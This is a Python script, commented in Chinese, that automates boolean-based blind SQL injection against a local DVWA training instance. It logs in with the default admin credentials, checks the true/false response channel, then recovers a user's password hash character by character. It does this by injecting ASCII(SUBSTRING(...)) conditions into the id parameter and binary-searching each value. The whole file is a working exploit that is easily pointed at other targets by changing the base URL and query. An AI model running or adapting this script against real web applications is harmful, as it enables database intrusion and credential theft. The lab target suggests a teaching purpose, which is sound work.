#!/usr/bin/env python3
"""DVWA 布尔盲注提取器（纯标准库，零依赖）

核心思路：
    盲注页面只有两种回答：exists / MISSING，等于一个比特。
    把 "取第 pos 个字符" 拆成 "这个字符的 ASCII 码是否大于 mid"，
    用二分法 7 次请求就能定位一个字符（0-127 的范围）。

用法：
    python3 blind_extract.py        # 提取 user_id=1 的密码
    python3 blind_extract.py 2      # 提取 user_id=2 的密码
"""

import re
import sys
import urllib.request
import urllib.parse
import http.cookiejar

BASE = "http://127.0.0.1:8888"
TARGET = sys.argv[1] if len(sys.argv) > 1 else "1"
MAXLEN = 32          # DVWA 的密码列是 md5，固定 32 位
TABLE = "password"   # 想换列就改这里，比如 user

jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def get(url):
    return op.open(url, timeout=10).read().decode("utf-8", "replace")


def post(url, data):
    body = urllib.parse.urlencode(data).encode()
    return op.open(urllib.request.Request(url, data=body), timeout=10).read().decode("utf-8", "replace")


def token(html):
    m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([0-9a-fA-F]+)['\"]", html)
    return m.group(1) if m else ""


# 登录：盲注页面本身要登录后才能访问
post(BASE + "/login.php", {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token(get(BASE + "/login.php")),
})


def ask(cond):
    """把一个布尔条件拼进 AND，返回页面是否回答 exists"""
    payload = "1' AND " + cond + "#"
    url = BASE + "/vulnerabilities/sqli_blind/?id=" + urllib.parse.quote(payload) + "&Submit=Submit"
    return "exists in the database" in get(url)


# 先自检通道：恒真必须 exists，恒假必须不是 exists
# 这一步很重要 —— 如果通道本身有问题，后面二分出来的全是垃圾
assert ask("'1'='1"), "通道异常：恒真条件没有返回 exists"
assert not ask("'1'='2"), "通道异常：恒假条件仍然返回 exists"
print("[*] 布尔通道正常（真 = exists / 假 = MISSING）")
print(f"[*] 目标: users.user_id={TARGET} 的 {TABLE} 列\n")

result = ""
for pos in range(1, MAXLEN + 1):
    # 二分：每次问 "ASCII 值 > mid 吗"，区间折半
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (
            f"ASCII(SUBSTRING((SELECT {TABLE} FROM users WHERE user_id={TARGET}),{pos},1))>{mid}"
        )
        if ask(cond):
            lo = mid + 1
        else:
            hi = mid

    ch = chr(lo)
    if lo == 0:
        # SUBSTRING 越界会返回空串，ASCII('') = 0，说明字符串到头了
        print(f"[{pos:02d}] 取到结尾")
        break

    result += ch
    print(f"[{pos:02d}] ASCII={lo:3d} -> {ch!r}    累计: {result}")

print("\n提取结果:", result)
